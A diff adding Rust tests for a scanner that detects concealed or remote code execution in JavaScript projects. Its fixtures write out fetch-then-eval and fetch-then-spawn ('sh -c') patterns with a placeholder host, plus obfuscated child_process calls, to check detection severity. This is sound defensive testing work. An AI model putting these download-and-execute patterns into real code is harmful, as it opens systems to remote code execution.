@@ -388,7 +388,73 @@ fn benign_minified_bundle_does_not_become_critical() {
 }
 
 #[test]
-fn representative_benign_js_patterns_have_no_critical_findings() {
+fn obfuscation_is_correlated_only_with_reachable_execution() {
+    let root = temporary_directory("obfuscated-execution");
+    fs::write(
+        root.join("package.json"),
+        br#"{"scripts":{"start":"node main.js"}}"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("main.js"),
+        b"import { exec as launch } from 'node:child_process';\nconst _0x1=1,_0x2=2,_0x3=3,_0x4=4,_0x5=5,_0x6=6,_0x7=7,_0x8=8;\nconst encoded='A'; const value=encoded.charCodeAt(0)^_0x1;\ndebugger; launch(String(value));",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let finding = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|finding| finding["id"] == "JS-CONCEALED-EXECUTION")
+        .expect("reachable obfuscated process execution is correlated");
+    assert_eq!(finding["severity"], "high");
+    assert!(finding["evidence"].to_string().contains("npm start"));
+    assert!(report["files"].as_array().unwrap().iter().any(|file| {
+        file["path"] == "main.js"
+            && file["raw_signals"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .any(|signal| signal.as_str().unwrap().contains("_0x-style identifiers"))
+    }));
+    assert!(
+        finding["evidence"]
+            .to_string()
+            .contains("possible XOR string decoder")
+    );
+    assert!(finding["evidence"].to_string().contains("anti-debugging"));
+    fs::remove_dir_all(root).unwrap();
+
+    let root = temporary_directory("obfuscation-without-execution");
+    fs::write(
+        root.join("package.json"),
+        br#"{"scripts":{"start":"node main.js"}}"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("main.js"),
+        b"const _0x1=1,_0x2=2,_0x3=3,_0x4=4,_0x5=5,_0x6=6,_0x7=7,_0x8=8; const value='A'.charCodeAt(0)^_0x1; console.log(value);",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| { finding["id"] != "JS-CONCEALED-EXECUTION" })
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn representative_benign_js_patterns_complete_without_high_findings() {
     type Case<'a> = (&'a str, &'a [(&'a str, &'a [u8])]);
     let cases: &[Case<'_>] = &[
         ("vite", &[("vite.config.js", b"import { defineConfig } from 'vite'; export default defineConfig({ build: { outDir: 'dist' } });")]),
@@ -404,12 +470,15 @@ fn representative_benign_js_patterns_have_no_critical_findings() {
         }
         let output = run(&[root.to_str().unwrap(), "--format=json"]);
         let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert_eq!(report["status"], "complete", "{label}");
         assert!(
             report["findings"]
                 .as_array()
                 .unwrap()
                 .iter()
-                .all(|finding| finding["severity"] != "critical"),
+                .all(|finding| {
+                    finding["severity"] != "high" && finding["severity"] != "critical"
+                }),
             "{label}"
         );
         fs::remove_dir_all(root).unwrap();
@@ -631,6 +700,234 @@ fn cross_file_response_decode_reaches_computed_function() {
 }
 
 #[test]
+fn remote_response_reaches_mutated_dynamic_execution_sinks() {
+    let cases = [
+        (
+            "vm-named-import",
+            "import { runInNewContext as execute } from 'node:vm';",
+            "execute(payload);",
+        ),
+        (
+            "vm-call-import",
+            "import { runInNewContext as execute } from 'node:vm';",
+            "execute.call(null, payload);",
+        ),
+        (
+            "vm-computed-member",
+            "import * as vm from 'node:vm';",
+            "vm['runInNew' + 'Context'](payload);",
+        ),
+        (
+            "vm-script",
+            "const vm = require('node:vm');",
+            "new vm.Script(payload);",
+        ),
+        ("function-constructor", "", "new Function(payload);"),
+        (
+            "computed-global-function",
+            "",
+            "global['Fun' + 'ction'](payload);",
+        ),
+        ("computed-global-eval", "", "global['e' + 'val'](payload);"),
+        (
+            "vm-apply-import",
+            "import { runInContext as execute } from 'node:vm';",
+            "execute.apply(null, [payload, {}]);",
+        ),
+        ("eval-call", "", "eval.call(null, payload);"),
+        ("eval-apply", "", "eval.apply(null, [payload]);"),
+        ("dynamic-import", "", "await import(payload);"),
+        ("dynamic-require", "", "require(payload);"),
+    ];
+    for (label, imports, sink) in cases {
+        let root = temporary_directory(label);
+        let source = format!(
+            "{imports}\nconst response = await fetch('https://example.invalid/payload');\nconst payload = await response.text();\n{sink}"
+        );
+        fs::write(root.join("main.js"), source).unwrap();
+
+        let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+        let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert!(
+            report["findings"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .any(|finding| {
+                    finding["id"] == "JS-REMOTE-CODE-EXECUTION" && finding["severity"] == "critical"
+                }),
+            "{label}: {}",
+            report["findings"]
+        );
+        fs::remove_dir_all(root).unwrap();
+    }
+
+    let root = temporary_directory("static-data-is-not-remote-code");
+    fs::write(
+        root.join("main.js"),
+        b"const value = JSON.parse('{\"ok\":true}'); eval(String(value));",
+    )
+    .unwrap();
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| { finding["id"] != "JS-REMOTE-CODE-EXECUTION" })
+    );
+    fs::remove_dir_all(root).unwrap();
+
+    let root = temporary_directory("indirect-eval-this-argument");
+    fs::write(
+        root.join("main.js"),
+        b"const response = await fetch('https://example.invalid/payload'); const payload = await response.text(); eval.call(payload); eval.apply(payload);",
+    )
+    .unwrap();
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| { finding["id"] != "JS-REMOTE-CODE-EXECUTION" })
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn remote_response_reaches_mutated_process_execution_sinks() {
+    let cases = [
+        (
+            "exec-named-import",
+            "import { exec as run } from 'node:child_process';",
+            "run(payload);",
+        ),
+        (
+            "spawn-named-import",
+            "import { spawn as launch } from 'node:child_process';",
+            "launch('sh', ['-c', payload]);",
+        ),
+        (
+            "computed-process-member",
+            "const cp = require('node:child_process');",
+            "cp['sp' + 'awn']('sh', ['-c', payload]);",
+        ),
+        (
+            "exec-sync-import",
+            "import { execSync as run } from 'node:child_process';",
+            "run(payload);",
+        ),
+        (
+            "spawn-sync-computed-member",
+            "const cp = require('node:child_process');",
+            "cp['spawnSync']('sh', ['-c', payload]);",
+        ),
+        (
+            "exec-file-import",
+            "import { execFile as run } from 'node:child_process';",
+            "run('sh', ['-c', payload]);",
+        ),
+        (
+            "fork-import",
+            "import { fork as launch } from 'node:child_process';",
+            "launch(payload);",
+        ),
+        (
+            "process-apply-import",
+            "import { spawn as launch } from 'node:child_process';",
+            "launch.apply(null, ['sh', '-c', payload]);",
+        ),
+    ];
+    for (label, imports, sink) in cases {
+        let root = temporary_directory(label);
+        let source = format!(
+            "{imports}\nconst response = await fetch('https://example.invalid/payload');\nconst payload = await response.text();\n{sink}"
+        );
+        fs::write(root.join("main.js"), source).unwrap();
+
+        let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+        let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert!(
+            report["findings"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .any(|finding| {
+                    finding["id"] == "JS-REMOTE-PROCESS-EXECUTION"
+                        && finding["severity"] == "critical"
+                }),
+            "{label}: {}",
+            report["findings"]
+        );
+        fs::remove_dir_all(root).unwrap();
+    }
+}
+
+#[test]
+fn remote_labels_survive_object_and_argument_spread() {
+    let cases = [
+        (
+            "object-spread",
+            "const wrapped = { ...{ payload } }; eval(wrapped.payload);",
+            "JS-REMOTE-CODE-EXECUTION",
+        ),
+        (
+            "argument-spread",
+            "eval(...[payload]);",
+            "JS-REMOTE-CODE-EXECUTION",
+        ),
+        (
+            "process-argument-spread",
+            "const cp = require('node:child_process'); cp.spawn(...['sh', '-c', payload]);",
+            "JS-REMOTE-PROCESS-EXECUTION",
+        ),
+    ];
+    for (label, sink, rule) in cases {
+        let root = temporary_directory(label);
+        let source = format!(
+            "const response = await fetch('https://example.invalid/payload');\nconst payload = await response.text();\n{sink}"
+        );
+        fs::write(root.join("main.js"), source).unwrap();
+
+        let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+        let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert!(
+            report["findings"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .any(|finding| { finding["id"] == rule && finding["severity"] == "critical" }),
+            "{label}: {}",
+            report["findings"]
+        );
+        fs::remove_dir_all(root).unwrap();
+    }
+
+    let root = temporary_directory("object-spread-clean-field");
+    fs::write(
+        root.join("main.js"),
+        b"const response = await fetch('https://example.invalid/payload'); const payload = await response.text(); const source = { remote: payload, clean: 'literal' }; const { clean } = { ...source }; eval(clean);",
+    )
+    .unwrap();
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| { finding["id"] != "JS-REMOTE-CODE-EXECUTION" })
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn optional_chained_response_properties_reach_dynamic_execution() {
     let root = temporary_directory("optional-response-flow");
     fs::write(
@@ -772,6 +1069,43 @@ fn embedded_script_parse_and_count_limits_make_the_scan_incomplete() {
             .contains("embedded script limit")
     );
     fs::remove_dir_all(limited_root).unwrap();
+}
+
+#[test]
+fn global_semantic_module_limit_is_reported_once() {
+    let root = temporary_directory("semantic-module-limit");
+    for index in 0..10_001 {
+        fs::write(
+            root.join(format!("module-{index:05}.js")),
+            b"export const value = 1;",
+        )
+        .unwrap();
+    }
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    assert_eq!(output.status.code(), Some(2));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(report["status"], "incomplete");
+    let limits = report["incomplete_reasons"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|reason| {
+            reason
+                .as_str()
+                .unwrap()
+                .contains("global semantic analysis limit")
+        })
+        .collect::<Vec<_>>();
+    assert_eq!(limits.len(), 1);
+    assert!(
+        limits[0]
+            .as_str()
+            .unwrap()
+            .contains("additional modules were omitted")
+    );
+    fs::remove_dir_all(root).unwrap();
 }
 
 #[test]
